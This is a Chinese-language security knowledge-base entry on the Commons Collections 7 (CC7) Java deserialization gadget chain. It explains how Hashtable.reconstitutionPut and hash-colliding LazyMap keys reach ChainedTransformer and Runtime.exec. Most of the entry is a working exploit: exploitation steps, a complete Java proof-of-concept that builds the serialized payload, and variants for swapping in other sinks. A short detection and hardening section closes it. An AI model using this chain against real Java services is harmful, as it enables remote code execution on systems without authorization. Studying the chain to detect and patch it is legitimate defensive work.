---
id: web-java-deser-commonscollections-cc7-hashtable-equals-lazymap
title: CC7 Hashtable reconstitutionPut + AbstractMap.equals 触发 LazyMap
type: scenario
domain: web
path: web/java/deserialization
technique: cc7-hashtable-equals-lazymap
aliases:
- CC7
- Hashtable equals 链
- LazyMap equals 触发
- Commons Collections 7
- reconstitutionPut
tags:
- java
- deserialization
- gadget
- commons-collections
- cc7
- hashtable
- equals
- lazymap
cve: []
severity: high
confidence: high
status: verified
affected_versions: Commons Collections <= 3.2.1（原文）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:08:55+08:00'
  notes: 已对照原文核对：Hashtable.readObject→reconstitutionPut 的 (e.hash==hash)&&e.key.equals(key)、LazyMap→AbstractMapDecorator.equals→AbstractMap.equals→m.get(key)、yy/zZ 哈希碰撞（3872）、空 ChainedTransformer 先 put 再反射填 iTransformers、lazymap2.remove(yy) 清缓存均与原文一致；affected_versions 按原文 CC<=3.2.1 标注
---

## 一句话结论

在 Commons Collections <= 3.2.1 中，`Hashtable.readObject()` 恢复键值对时调用 `reconstitutionPut`，对同槽位的 key 执行 `e.key.equals(key)`；用两个哈希碰撞的 `LazyMap` 作为 key，可让 `AbstractMapDecorator.equals` → `AbstractMap.equals` 调用 `LazyMap.get()`，从而触发 `ChainedTransformer` 命令执行。

## 原理

- `Hashtable.readObject()` 读取每个键值对后调用 `reconstitutionPut(table, key, value)`；该方法计算 `key.hashCode()`，定位槽位，并对槽位中已有 entry 执行 `if ((e.hash == hash) && e.key.equals(key))`。要走到 `equals`，两个 key 的哈希必须相同（同槽位且 hash 相等）。
- `LazyMap` 继承 `AbstractMapDecorator`，其 `equals` 实现为 `object == this ? true : this.map.equals(object)`；`this.map` 是底层 `HashMap`，进入 `AbstractMap.equals`。
- `AbstractMap.equals` 遍历自身 entry，对每个 key 调用 `m.get(key)`（m 为另一个 Map）。如果 m 是 `LazyMap`，`get(key)` 在 key 不存在时调用 `factory.transform(key)`，进入 `ChainedTransformer`。
- 选择 `"yy"` 与 `"zZ"` 作为两个 `LazyMap` 的键：Java String 的哈希值相同（都是 3872），满足 `e.hash == hash`；两个 LazyMap 分别放入这两个键值，再作为 Hashtable 的两个 key。
- 时序问题：`Hashtable.put` 会调用 key.hashCode()，可能提前触发 LazyMap 里的链；`Hashtable` 插入第二个元素时也会做 equals 比较，可能给 `lazymap2` 写入 `"yy"`，导致反序列化时 `LazyMap.get("yy")` 直接命中已有值而不 transform。解决：先用空的 `ChainedTransformer` 完成 put，再反射设置 `iTransformers`，最后 `lazymap2.remove("yy")` 清除缓存。

## 触发条件

- Commons Collections <= 3.2.1（`LazyMap`、`ChainedTransformer`、`InvokerTransformer` 可用）。
- 目标存在 Java 原生反序列化入口，未过滤 `Hashtable`、`LazyMap`、`ChainedTransformer` 等类。
- JDK 的 `Hashtable.readObject` 会对同槽位 key 执行 `equals`（JDK 8 及常见版本如此）。
- `Runtime.exec` 未被策略阻断。

## 利用步骤

1. 构造 `ChainedTransformer(new Transformer[]{})`（先空），用 `LazyMap.decorate(new HashMap(), chain)` 创建 `lazymap1`、`lazymap2`。
2. `lazymap1.put("yy", 1)`、`lazymap2.put("zZ", 1)`，确保两个键哈希碰撞。
3. `Hashtable` 依次 `put(lazymap1, 1)`、`put(lazymap2, 2)`。
4. 反射把 `chain.iTransformers` 设置为 Runtime.exec 链（避免 put 阶段提前执行）。
5. `lazymap2.remove("yy")` 清除插入时产生的缓存，确保反序列化时 `get` 重新 transform。
6. 序列化 `Hashtable` 并发送到目标。

## PoC

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {
    public static void main(String[] args) throws Exception {
        Transformer[] ts = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, null}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"})
        };
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{});

        Map lazy1 = LazyMap.decorate(new HashMap(), chain);
        Map lazy2 = LazyMap.decorate(new HashMap(), chain);
        lazy1.put("yy", 1);   // "yy".hashCode() == "zZ".hashCode()
        lazy2.put("zZ", 1);

        Hashtable<Object, Object> table = new Hashtable<>();
        table.put(lazy1, 1);
        table.put(lazy2, 2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chain, ts);

        lazy2.remove("yy");   // 清除 put 阶段产生的缓存

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(table);
        }
    }
}
```

```text
# 链：
# Hashtable.readObject()
#   -> reconstitutionPut()
#     -> LazyMap.equals()          (AbstractMapDecorator.equals)
#       -> AbstractMap.equals()
#         -> LazyMap.get("yy")
#           -> ChainedTransformer.transform()
#             -> Runtime.getRuntime().exec("calc")
```

## 变体与关联

- 变体：哈希碰撞的字符串不限于 `"yy"`/`"zZ"`，任何同哈希字符串对都可；也可用其它 Map 实现构造 equals 入口。
- 变体：`ChainedTransformer` 可换成 CC4/CC3 的 TemplatesImpl sink；`LazyMap` 可换成 `TransformedMap` 等。
- 关联：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（HashMap 触发 LazyMap 的另一入口）；[[web-java-deser-commonscollections-cc5-badattribute-tostring]]（toString 触发 LazyMap）；[[web-java-deser-commonscollections-cc1-transformedmap]]（TransformedMap 入口）。
- 边界：两个 key 哈希不相等时 `reconstitutionPut` 不会调用 equals；`lazymap2` 未清除 `"yy"` 时反序列化会命中缓存而不 transform；CC 3.2.2+/JEP 290 过滤时失效。

## 检测与防御

- 检测：序列化流中出现 `Hashtable` + `LazyMap` + `ChainedTransformer` 组合；反序列化后出现 `Runtime.exec`/子进程；监控同哈希字符串对（`yy`/`zZ`）作为 Map key 的异常结构。
- 修复：升级 Commons Collections 到 3.2.2+ 并关闭 unsafe serialization；消除不可信 Java 原生反序列化。
- 加固：JEP 290 `ObjectInputFilter` 白名单，拒绝 `LazyMap`、`ChainedTransformer` 等非业务类；限制 `Hashtable` 在反序列化入口的使用。
